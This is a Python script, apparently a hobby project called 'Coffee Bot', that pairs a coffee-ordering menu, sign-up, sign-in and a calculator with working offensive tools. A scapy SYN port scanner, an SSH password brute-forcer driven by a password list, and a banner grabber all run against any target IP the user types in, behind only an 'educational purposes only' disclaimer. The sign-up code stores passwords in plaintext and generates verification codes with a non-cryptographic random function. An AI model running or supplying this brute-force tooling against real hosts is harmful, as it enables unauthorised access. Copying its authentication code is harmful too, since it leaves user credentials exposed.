#My coffee bot Yaniv Bouzaglo version 1.3
import email
import socket
import pymongo
import time
import ssl
from email.message import EmailMessage
import smtplib
import random
import os
from socket import timeout
from sys import flags
from scapy.all import *
from scapy.layers.inet import TCP, IP, Ether, ICMP
from scapy.layers.l2 import ARP
import paramiko
from dotenv import load_dotenv
load_dotenv()
db_creds = os.getenv("db_creds")
env1 = os.getenv("env1")
env2 = os.getenv("env2")
print("Hello and welcome to our Coffee Bot version 1.3 Developed by Yaniv Bouzaglo.\n\n"
      "Your Coffee orders will sent from our bot to our working department kitchen directly.\n"
      "This tool is for educational purposes only!, using it for malicious purposes will be on your responsibility.")
client = pymongo.MongoClient(f"mongodb+srv://{db_creds}.l2zbb.mongodb.net/?retryWrites=true&w=majority")
db = client.test
CoffeeBotDB = client["CoffeeBotDB"]
database = CoffeeBotDB["userDB"]
orders_history = CoffeeBotDB["orders history"]
welcome_options = ["[a] Sign up.","[b] Sign in.","[c] Forgot Password.","[d] Network Mapper.","[e] Banner Grabbing.","[f] Calculator"]
menu = ["Black Coffee","Cappuccino","Americano","Espresso","Latte","Tea"]
email_from = f"{env1}"
email_pass = f"{env2}"
def Verfication_Mail(email,body):
    try:
        email_to = f'{email}'
        subject = 'Hye, we are at your service, your coffee buddy'
        em = EmailMessage()
        em['From'] = email_from
        em['To'] = email_to
        em['Subject'] = subject
        em.set_content(body)
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(email_from, email_pass)
            smtp.sendmail(email_from, email_to, em.as_string())
    except:
        print("Check the mail address and try again please.")
        return False

def sign_up():
    global email
    while True:
        try:
            print("Sign up tp the bot.")
            name = input("Please insert your name here ==> ")
            user_name = input("Please insert your user name here ==> ")
            user_password = input("Please insert your password here ==> ")
            email = input("Please insert your email here ==> ")
            for i in database.find({"Type":"Registered"}):
                email_chk = (i["Email"])
                while email_chk == email:
                    print("Email address already in use in this bot.")
                    sign_up()
            pass_strength = True
            if len(user_password) < 8:
                print("Password must be at least 8 characters.")
                pass_strength = False
            if user_password.islower():
                print("Password does not contain uppercase letters.")
                pass_strength = False
            if user_password.isupper():
                print("Password does not contain lowercase letters.")
                pass_strength = False
            if user_password.isdigit():
                print("Password does not contain lowercase or uppercase letters.")
                pass_strength = False
            if "0" not in user_password and \
                "1" not in user_password and \
                "2" not in user_password and \
                "3" not in user_password and \
                "4" not in user_password and \
                "5" not in user_password and \
                "6" not in user_password and \
                "7" not in user_password and \
                "8" not in user_password and \
                "9" not in user_password:
                print("Password must contain at least 1 digit")
                pass_strength = False
            if pass_strength == True:
                print(f"sending verification email to {email}....")
                code = code_gen()
                body = f"""
Hye there {name} In order to register to our coffee bot please insert the code {code} to the bot .
            """
                status = Verfication_Mail(email,body)
                if status == False:
                    print("Sign up proccess failed please try again.")
                    sign_up()
                else:
                    print(f"Two step verification!")
                    code_input = int(input("Insert the six digits code here ==> "))
                if code_input == code:
                    print("Siginig you up....")
                    data = {"Type": "Registered","Name": f"{name}", "Email": f"{email}", "Username": f'{user_name}', "Password": f'{user_password}'}
                    database.insert_one(data)
                    print("Signed up seccussfully!")
                    break
                else:
                    print("Something went wrong with the code inserted please try again.")
            else:
                print("Password is weak!")
        except ValueError as e:
            print("Insert only numbers in the six digits code section.")
def code_gen():
    code = random.randint(100000,999999)
    return code
def sign_in():
    global email
    print("Sign in to the bot.")
    global inp_a
    print(f"This bot uses two step authentication.")
    inp_a = input("Please insert your email address here ==> ")
    inp_b = input("Please insert your password here ==> ")
    for i in database.find({"Type":"Registered"}):
        a = i["Email"]
        b = i["Password"]
        db = {f'{a}',f'{b}'}
        for key in db:
            if inp_a == a and inp_b == b:
                fin = True
                if fin == True:
                    print("Sending verification email to your mail....")
                    code = code_gen()
                    email = inp_a
                    body = f"""
Hye there, In order to sign in to our coffee bot please insert the code {code} to the bot .
            """
                Verfication_Mail(email,body)
                code_input = int(input("Insert the six digits code here ==> "))
                if code_input == code:
                    print("Signed in successfully!")
                    return True
                    break
                else:
                    print("Authentication failed!\nDisconnecting....")
                    time.sleep(3)
                    exit()
            else:
                fin = False
            
     
def Forgot_Password():
    email = input("We'll send an email to reset your password, INSERT EMAIL HERE ==> ")
    for i in database.find({"Type":"Registered","Email":f"{email}"}):
        old_password = {"Password":i["Password"]}
        new_password_input = input("Insert your new password here ==> ")
        new_password = {"$set":{"Password":f"{new_password_input}"}}
        code = code_gen()
        body = f"""
Hye there, In order to reset your password please insert the code {code} to the bot .
            """
        Verfication_Mail(email,body)
        code_input = int(input("Insert the six digits code here ==> "))
        if code_input == code:
            database.update_one(old_password,new_password)
            print("Your password updated!")
            main()
        else:
            print("Something went wrong with the code inserted, your password did not update.")
            main()
    print("Authentication failed!\nRedirecting....")
    time.sleep(3)
    main()
def Network_Mapper():
        # Asking the user for target ip address
    target = input("Please insert your target IP: ==> ")

    # Creating variable that equals to all registered ports
    Registered_Ports = range(1,100)

    # Creating an empty list by name Open_Ports
    Open_Ports = []

    # Creating scan port function with single argument followed by the name port
    def ScanPort(port):
        src_port = RandShort()
        conf.verb = 0
        Syn_Pkt = sr1(IP(dst=target)/TCP(sport=src_port,dport=port,flags="S"), timeout=0.5)
        if Syn_Pkt:
            if Syn_Pkt.haslayer(TCP):
                if Syn_Pkt[1].flags == 0x12:
                    sr(IP(dst=target)/TCP(sport=src_port,dport=port,flags="R"), timeout=2)
                    return True
            else:
                return False
        else:
            return False
    # Creating availability check fuction on the target address
    def target_availability():
        try:
            conf.verb = 0
            Send_Ping = sr1(IP(dst=target)/ICMP(),timeout=3)
        except Exception as e:
            print(e)
            return False

        if Send_Ping:
                return True
    target_availa = target_availability()
    def attack():
        if target_availa == True:
            for port in Registered_Ports:
                status = ScanPort(port)
                if status == True:
                    Open_Ports.append(port)
            print(f"The scan is complete, the open ports on the target scanned are:\n{Open_Ports}")
            if 22 in Open_Ports:
                port = 22
                brt_frc = input("The scan discovered that port 22 is open would you like to preform brute force on that port? yes/no ==> ")
                if brt_frc == "yes" or brt_frc == "Yes" or brt_frc == "y" or brt_frc == "Y":
                    BruteForce(port)
                else:
                    print("BYE!")
                    main()
    def BruteForce(port):
        with open("PasswordList.txt","r") as myfile:
            passwords = myfile.read()
            passwords = passwords.split()
            user = input("Please insert the user name you want to preform brute force with : ==> ")
        SSHconn = paramiko.SSHClient()
        SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for password in passwords:
            try:
                SSHconn.connect(target, port=int(port), username=user, password=password, timeout=1)
                print(f"Success, the {password} logged you in the server!")
                SSHconn.close()
                break
            except Exception:
                print(f"The password {password} failed!")
    attack()
def Banner_Grabbing():
    while True:
        try:
            print("Type exit to go back to main menu.")
            sock = socket.socket()
            target = input("Insert your target IP: ==> ")
            port = input("Insert port to scan in the target machine: ==> ")
            if "exit" in port or "exit" in target:
                break
            else:
                sock.connect((target, int(port)))
                sock.send("What is your banner?\r\n".encode())
                socket.setdefaulttimeout(4)
                rec = sock.recv(1024).decode()
                print(f"[+] The banner of the service --> {rec} AND THE PORT IS : ==> {port}")
                sock.close()
        except:
            continue
    main()
def Menu_Inp(email):
    menu_input = input("Please choose from the list ahead:\n"
    f"[a] {menu[0]}\n\n"
    f"[b] {menu[1]}\n\n"
    f"[c] {menu[2]}\n\n"
    f"[d] {menu[3]}\n\n"
    f"[e] {menu[4]}\n\n"
    f"[f] {menu[5]}\n\n"
     "----- INSERT YOUR PICK HERE ----- > ")
    while True:
        if menu_input == 'a' or menu_input == 'A':
            order = menu[0]
            break
        elif menu_input == 'b' or menu_input == 'B':
            order = menu[1]
            break
        elif menu_input == 'c' or menu_input == 'C':
            order = menu[2]
            break
        elif menu_input == 'd' or menu_input == 'D':
            order = menu[3]
            break
        elif menu_input == 'e' or menu_input == 'E':
            order = menu[4]
            break
        elif menu_input == 'f' or menu_input == 'F':
            order = menu[5]
            break
        else:
            pass 
    tme = time.ctime(time.time())
    menu_input_dict = {"Email":f"{email}","Item":f"{order}","Time":f"{tme}"}
    orders_history.insert_one(menu_input_dict)
def Calculator():
#calculator
    def plus(num1,num2):
        return num1 + num2

    def minus(num1,num2):
        return num1 - num2

    def multi(num1,num2):
        return num1 * num2

    def divide(num1,num2):
        return num1 / num2

    def modoulo(num1,num2):
        return num1 % num2

    def calc():
        while True:
            try:
                num1 = int(input('num1: '))
                action = input('+,-,/,*,% ')
                num2 = int(input('num2: '))
                if action == '+':
                    print(plus(num1,num2))
                elif action == '-':
                    print(minus(num1,num2))
                elif action == '/':
                    print(divide(num1,num2))
                elif action == '*':
                    print(multi(num1,num2))
                elif action == '%':
                    print(modoulo(num1,num2))
                else:
                    print('Wrong action')
                brk = input('Press q to quit press any key to continue.\n')
                if brk == 'q':
                    break
            except ZeroDivisionError as Error101:
                print(Error101,'error101,Cannot Divide by zero!')
            except ValueError as Error102:
                print(Error102,'error102,invalid input digits only.')
            except:
                print('HAPPY PRACTICE')
        main()
    calc()

def main():
    welcome_options_input = input("Please choose from the list ahead :\n"
    f"{welcome_options[0]}\n\n"
    f"{welcome_options[1]}\n\n"
    f"{welcome_options[2]}\n\n"
    f"{welcome_options[3]}\n\n"
    f"{welcome_options[4]}\n\n"
    f"{welcome_options[5]}\n\n"
    "----- INSERT YOUR PICK HERE ----- > ")
    if welcome_options_input == 'a' or welcome_options_input == 'A':
        sign_up()
        if sign_in() == True:
            Menu_Inp(email)
        else:
            print("Authentication proccess failed\nREDIRECTING.......")
            time.sleep(3)
            main()
    elif welcome_options_input == 'b' or welcome_options_input == 'B':
        if sign_in() == True:
            Menu_Inp(email)
            
        else:
            print("Authentication proccess failed\nREDIRECTING.......")
            time.sleep(3)
            main()
    elif  welcome_options_input == 'c' or welcome_options_input == 'C':
        Forgot_Password()
    elif welcome_options_input == 'd' or welcome_options_input == 'D':
        Network_Mapper()
    elif welcome_options_input == 'e' or welcome_options_input == 'E':
        Banner_Grabbing()
    elif welcome_options_input == 'f' or welcome_options_input == 'F':
        Calculator()
    else:
        pass
main()
